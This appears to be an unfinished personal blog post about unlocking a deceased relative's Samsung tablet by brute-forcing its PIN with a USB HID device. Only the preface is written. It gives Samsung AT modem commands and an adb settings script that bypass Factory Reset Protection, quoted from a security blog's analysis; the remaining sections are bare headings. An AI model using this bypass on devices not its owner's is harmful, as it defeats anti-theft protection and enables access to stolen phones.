---
layout: post
title:  "Brutefocing Phones Using HID Devices"
---

# Preface
So my aunt recently died and left behind a perfectly good Samsung Galaxy S7 FE tablet. Unfortunatly (or fortunatly for you the interested reader) we did not know the password for the device which left us with one option: Factory Reset.

Unfortunatly all modern Android devices employ a feature Google calls **FRP** (Factory Reset Protection) which requires you to either:
- Enter the correct PIN / the correct Pattern
- or sign in with the connected Google Account.

Unfortunatly neither of those where available to me so I had to find anoter solution:

### The Easy Way
Before going into the main topic of this blog post I want to point out that there are much easier ways to perform what I did. There are still many different FRP bypasses available and you might find a working one if you google a while.
For this specific device and many others Samsung was nice enough to add a small backdoor in their baseband with can be used to enable adb and use it to uninstall the app responsble for FRP. The flow goes something like this:
- Open the Dialer (though some talkback trickery)
- enter `*#0*#` in the dialer to open the Samung debug menu which connects the phones modem in serial mode to a USB connected computer
- use the AT commands to communicate with the modem and enable usb debugging (modem version depended, the following commands did not work for my device)
  ```
  AT+KSTRINGB=0,3
  AT+DUMPCTRL=1,0
  AT+DEBUGLVC=0,5
  AT+SWATD=0
  AT+ACTIVATE=0,0,0
  AT+SWATD=1
  AT+DEBUGLVC=0,5
  ```
- we are now able this script that disables FRP by "finishing" the phone setup
```
settings put global setup_wizard_has_run 1
settings put secure user_setup_complete 1
content insert --uri content://settings/secure --bind name:s:DEVICE_PROVISIONED --bind value:i:1
content insert --uri content://settings/secure --bind name:s:user_setup_complete --bind value:i:1
content insert --uri content://settings/secure --bind name:s:INSTALL_NON_MARKET_APPS --bind value:i:1
am start -c android.intent.category.HOME -a android.intent.action.MAIN
# Wait 5 sec
am start -n com.android.settings/com.android.settings.Settings
# Wait 5 sec
reboot
```

These snippsts have been taken from the riskeco.com blog post: [https://blog-cyber.riskeco.com/en/analysis-of-samsung-frp-bypass/](https://blog-cyber.riskeco.com/en/analysis-of-samsung-frp-bypass/)


# Theory of hid input devices

# Requirements for android / Linux Kernel

# The Attack, Introducing the existing brute force solutions
- Gets reset after factory reset

# The tool
- exponetuinal growth
- adjusted wordlist
# Issues
- random resets?
- sucesss?
- skipping inputs
- tracking location

- Hid test vs echo

# Improvements and Future Work
- raspberry with stepper motor
- attacks based on input (dialer?) Frp bypass?


